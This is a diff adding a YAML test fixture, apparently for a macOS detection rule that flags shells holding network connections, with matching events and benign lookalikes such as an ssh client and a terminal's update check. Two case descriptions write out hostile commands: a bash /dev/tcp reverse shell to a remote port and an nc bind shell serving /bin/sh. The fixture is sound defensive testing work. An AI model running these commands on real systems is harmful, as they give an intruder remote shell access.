@@ -1,0 +1,50 @@
+match:
+  - desc: 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1 (reverse shell, seen executing)'
+    events:
+      - name: NetworkConnect
+        platform: macos
+        source: netpoll
+        proc: {pid: 6101, ppid: 6100, exe: /bin/bash, name: bash, cmdline: "bash -i", args: [bash, -i], uid: 501, euid: 501, signing_id: com.apple.bash, is_platform: true, is_signed: true}
+        net: {proto: tcp, direction: outbound, sip: 10.0.0.5, sport: 50111, dip: 203.0.113.9, dport: 4444}
+        args: {fd: "0"}
+  - desc: 'nc -l 4444 -e /bin/sh: bind shell answering an inbound connection, kernel identity only'
+    events:
+      - name: NetworkAccept
+        platform: macos
+        source: netpoll
+        proc: {pid: 6103, ppid: 6102, exe: /bin/sh, name: sh, uid: 501, euid: 501, is_platform: true, seeded: true}
+        net: {proto: tcp, direction: inbound, sip: 198.51.100.7, sport: 61200, dip: 10.0.0.5, dport: 4444}
+        args: {fd: "1", identity: unverified}
+  - desc: zsh from Homebrew with a connected UDP socket to a remote host
+    events:
+      - name: NetworkConnect
+        platform: macos
+        source: netpoll
+        proc: {pid: 6105, ppid: 6104, exe: /opt/homebrew/bin/zsh, name: zsh, uid: 501, euid: 501, is_platform: false, is_signed: true}
+        net: {proto: udp, direction: outbound, sip: 10.0.0.5, sport: 50300, dip: 203.0.113.20, dport: 53}
+        args: {fd: "2"}
+nomatch:
+  - desc: benign lookalike - ssh client (the shell's child) holds the connection, not the shell
+    events:
+      - name: NetworkConnect
+        platform: macos
+        source: netpoll
+        proc: {pid: 6111, ppid: 6110, exe: /usr/bin/ssh, name: ssh, cmdline: "ssh build@203.0.113.40", uid: 501, euid: 501, signing_id: com.apple.ssh, is_platform: true, is_signed: true}
+        net: {proto: tcp, direction: outbound, sip: 10.0.0.5, sport: 50400, dip: 203.0.113.40, dport: 22}
+        args: {fd: "3"}
+  - desc: benign lookalike - a shell listening socket (not a connection) is not matched
+    events:
+      - name: NetworkAccept
+        platform: macos
+        source: netpoll
+        proc: {pid: 6112, ppid: 6110, exe: /bin/bash, name: bash, uid: 501, euid: 501, is_platform: true, is_signed: true}
+        net: {proto: tcp, direction: listen, dip: 0.0.0.0, dport: 8000}
+        args: {fd: "3"}
+  - desc: benign lookalike - the terminal emulator (not the shell inside it) checks for updates
+    events:
+      - name: NetworkConnect
+        platform: macos
+        source: netpoll
+        proc: {pid: 6113, ppid: 1, exe: /Applications/iTerm.app/Contents/MacOS/iTerm2, name: iTerm2, uid: 501, euid: 501, team_id: H7V7XYVQ7D, cs_category: developer_id, is_platform: false, is_signed: true}
+        net: {proto: tcp, direction: outbound, sip: 10.0.0.5, sport: 50402, dip: 203.0.113.41, dport: 443}
+        args: {fd: "12"}
